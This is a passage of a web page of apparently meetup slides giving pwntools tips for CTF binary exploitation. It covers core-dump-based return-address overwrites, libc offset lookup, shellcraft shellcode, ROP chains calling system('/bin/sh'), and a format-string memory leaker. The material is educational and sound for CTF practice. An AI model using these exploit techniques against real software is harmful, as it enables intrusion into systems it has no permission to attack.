</code></pre>
<pre><code>[x] Starting local process '/mnt/c/Users/Jannik/Downloads/ctfs/pwntools_tips/chall'
[+] Starting local process '/mnt/c/Users/Jannik/Downloads/ctfs/pwntools_tips/chall': pid 17264
[*] Stopped process '/mnt/c/Users/Jannik/Downloads/ctfs/pwntools_tips/chall' (pid 17264)
</code></pre>
<h1 id="elf---debugging"><a class="header" href="#elf---debugging">ELF - Debugging</a></h1>
<pre><code class="language-python"># Start in debugger (using gdbserver)
io = exe.debug() # gdb.debug(exe.path)

# Attach to running process
io = exe.process()
gdb.attach(io)

# Attach to local listening process
io = remote('localhost', 1337)
gdb.attach(io)

# Interact with debugger
with exe.debug(api=True) as io:
    io.gdb.Breakpoint('puts', temporary=True)
    io.gdb.continue_and_wait()

    text_ptr = io.gdb.parse_and_eval('$rdi').cast(gdb.lookup_type('int'))
    text = io.gdb.selected_inferior().read_memory(text_ptr, 20)

    print(text)

    io.gdb.quit()
</code></pre>
<h1 id="elf---coredumps"><a class="header" href="#elf---coredumps">ELF - coredumps</a></h1>
<pre><code class="language-python">exe = ELF('./chall')
io = exe.process()

# crash the process
io.sendline(cyclic(256))
# wait until the process terminated
io.poll()

# lookup core dump
core = io.corefile

# access value of rip in core file
payload = flat({
    cyclic_find(core.rip): exe.symbols.win
})
# core.fault_addr or core.signal available

io = exe.process()
io.sendline(payload)
io.interactive()
</code></pre>
<h1 id="elf---libc"><a class="header" href="#elf---libc">ELF - libc</a></h1>
<pre><code class="language-python">context.clear()
context.timeout = 1
context.binary = './chall'
</code></pre>
<pre><code class="language-python">libc = exe.libc
</code></pre>
<pre><code>[*] '/usr/lib/x86_64-linux-gnu/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    SHSTK:    Enabled
    IBT:      Enabled
</code></pre>
<pre><code class="language-python"># Find return address from `main`
hex(libc.libc_start_main_return)
</code></pre>
<pre><code>0x24083
</code></pre>
<h1 id="libcdb"><a class="header" href="#libcdb">LIBCDB</a></h1>
<ul>
<li>interface with https://libc.rip/ and https://gitlab.com/libcdb/libcdb</li>
<li><code>libcdb</code> module as well as command line tool</li>
</ul>
<pre><code>$ libcdb file /lib/x86_64-linux-gnu/libc.so.6
[*] libc.so.6
    Version:     2.31
    BuildID:     1878e6b475720c7c51969e69ab2d276fae6d1dee
    MD5:         5898fac5d2680d0d8fefdadd632b7188
    SHA1:        1430c57bf7ca6bd7f84a11c2cb7580fc39da07f5
    SHA256:      80378c2017456829f32645e6a8f33b4c40c8efa87db7e8c931a229afa7bf6712
    Symbols:
        __libc_start_main_ret = 0x24083
                         dup2 = 0x10e8c0
                       printf = 0x61c90
                         puts = 0x84420
                         read = 0x10dfc0
                   str_bin_sh = 0x1b45bd
                       system = 0x52290
                        write = 0x10e060
</code></pre>
<h1 id="libcdb-commandline"><a class="header" href="#libcdb-commandline">LIBCDB commandline</a></h1>
<ul>
<li>lookup by buildid
<ul>
<li><code>libcdb hash 1878e6b475720c7c51969e69ab2d276fae6d1dee</code></li>
</ul>
</li>
<li>lookup by id
<ul>
<li><code>libcdb hash -t id libc6_2.31-0ubuntu9.9_amd64</code></li>
</ul>
</li>
<li>lookup by leaked offsets
<ul>
<li><code>libcdb lookup printf c90 system 0x52290</code></li>
</ul>
</li>
<li>download matching libc
<ul>
<li><code>libcdb hash -t id --download-libc libc6_2.31-0ubuntu9.9_amd64</code></li>
</ul>
</li>
<li>unstrip / add back debug symbols
<ul>
<li><code>libcdb file --unstrip libc.so.6</code></li>
</ul>
</li>
</ul>
<h1 id="libcdb-module"><a class="header" href="#libcdb-module">LIBCDB module</a></h1>
<pre><code class="language-python"># Download libc and return path to it
libcdb.search_by_build_id('1878e6b475720c7c51969e69ab2d276fae6d1dee', unstrip=True)

# Unstrip any binary in place
libcdb.unstrip_libc('./libc.so.6')
</code></pre>
<h2 id="lookup-by-leaked-function-offsets"><a class="header" href="#lookup-by-leaked-function-offsets">Lookup by leaked function offsets</a></h2>
<ul>
<li>with interactive prompt on multiple matches</li>
</ul>
<pre><code class="language-python">libc = ELF(libcdb.search_by_symbol_offsets({'puts': puts_leak, 'printf': printf_leak}))
</code></pre>
<h1 id="assembly--disassembly"><a class="header" href="#assembly--disassembly">Assembly / Disassembly</a></h1>
<ul>
<li>shortcut for binutils</li>
<li>cross-architecture</li>
<li><strong>shellcraft</strong> - shellcode templates</li>
</ul>
<pre><code class="language-python">asm('mov rax, 1; syscall')
</code></pre>
<pre><code>b'H\xc7\xc0\x01\x00\x00\x00\x0f\x05'
</code></pre>
<pre><code class="language-python">asm('push 0x41414141; lea edi, [esp+0x10]', os='linux', arch='i386', bits='32')
</code></pre>
<pre><code>b'hAAAA\x8d|$\x10'
</code></pre>
<pre><code class="language-python">asm('ldr x1, [x2]', arch='arm64')
</code></pre>
<pre><code>b'A\x00@\xf9'
</code></pre>
<pre><code class="language-python">print(disasm(asm('mov rax, 1; syscall')))
</code></pre>
<pre><code>   0:   48 c7 c0 01 00 00 00    mov    rax, 0x1
   7:   0f 05                   syscall
</code></pre>
<h1 id="shellcraft"><a class="header" href="#shellcraft">Shellcraft</a></h1>
<ul>
<li>(mostly) null-byte and newline free shellcode</li>
<li>generated dynamically for real values at runtime</li>
<li>uses mako template engine</li>
</ul>
<pre><code class="language-python">print(shellcraft.linux.dupio())
</code></pre>
<pre><code>    /* dup() file descriptor rbp into stdin/stdout/stderr */
    mov rdi, rbp
    push 2
    pop rsi
loop_1:
    /* dup2(fd='rdi', fd2='rsi') */
    /* setregs noop */
    /* call dup2() */
    push SYS_dup2 /* 0x21 */
    pop rax
    syscall
    dec rsi
    jns loop_1
</code></pre>
<h1 id="rop"><a class="header" href="#rop">ROP</a></h1>
<ul>
<li>based on ROPgadget</li>
</ul>
<pre><code class="language-python">exe = ELF('./chall', checksec=False)
rop = ROP(exe)

# set registers
rop.rdi = 5
# multiple at once
rop(rsi=0x41414141, r15=0xcafe)

print(rop.dump())
</code></pre>
<pre><code>[*] Loading gadgets for '/mnt/c/Users/Jannik/Downloads/ctfs/pwntools_tips/chall'
0x0000:         0x4013a3 pop rdi; ret
0x0008:              0x5
0x0010:         0x4013a1 pop rsi; pop r15; ret
0x0018:       0x41414141
0x0020:           0xcafe
</code></pre>
<pre><code class="language-python"># Lookup gadgets as attributes
rop.rsi_r15
</code></pre>
<pre><code>Gadget(0x4013a1, ['pop rsi', 'pop r15', 'ret'], ['rsi', 'r15'], 0x18)
</code></pre>
<h1 id="rop-1"><a class="header" href="#rop-1">ROP</a></h1>
<pre><code class="language-python">libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
</code></pre>
<pre><code class="language-python">rop = ROP([exe, libc])

# manual call
rop.call(0xaaaaaa, [1234, 5678])

# shorthand
rop.system(next(exe.libc.search(b'/bin/sh')))

print(rop.dump())
</code></pre>
<pre><code>[*] Loading gadgets for '/usr/lib/x86_64-linux-gnu/libc-2.31.so'
0x0000:         0x4013a3 pop rdi; ret
0x0008:            0x4d2 [arg0] rdi = 1234
0x0010:          0x2601f pop rsi; ret
0x0018:           0x162e [arg1] rsi = 5678
0x0020:         0xaaaaaa
0x0028:         0x4013a3 pop rdi; ret
0x0030:         0x1b45bd [arg0] rdi = 1787325
0x0038:          0x52290 system
</code></pre>
<h1 id="memory-leaker"><a class="header" href="#memory-leaker">Memory leaker</a></h1>
<pre><code class="language-python">pwnlib.memleak.MemLeak(f, search_range=20, reraise=True, relative=False)
</code></pre>
<ul>
<li>Caches leaked data</li>
<li>Tries surrounding address if leak failed</li>
</ul>
<pre><code class="language-python">@MemLeak
def leaker(addr):
    to_leak = p64(addr)
    if b'\n' in to_leak:
        return None
    io.sendlineafter(b'&gt; ', b'%08$7xAA' + to_leak)
    return unhex(io.recvuntil(b'AA', drop=True))

# leak from starting address
leaker(0x4000102)
# leak an address range
leaker[0x4000102:0x4000112]
# unpack right away
leaker.u64(exe.got.puts)
</code></pre>
<p><img src="./logo.png" alt="logo" /></p>
<h1 id="pwning-meetup-2"><a class="header" href="#pwning-meetup-2">PWNing Meetup #2</a></h1>
<p><img src="./pwntools_discord.png" alt="logo" /></p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../pentest/BurpSuite/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>
                            <a rel="next" href="../../pentest/pwntools/cheat_sheet/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../pentest/BurpSuite/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>
                    <a rel="next" href="../../pentest/pwntools/cheat_sheet/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="../../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        <script type="text/javascript" src="../../mermaid.min.js"></script>
        <script type="text/javascript" src="../../mermaid-init.js"></script>
    </body>
</html>
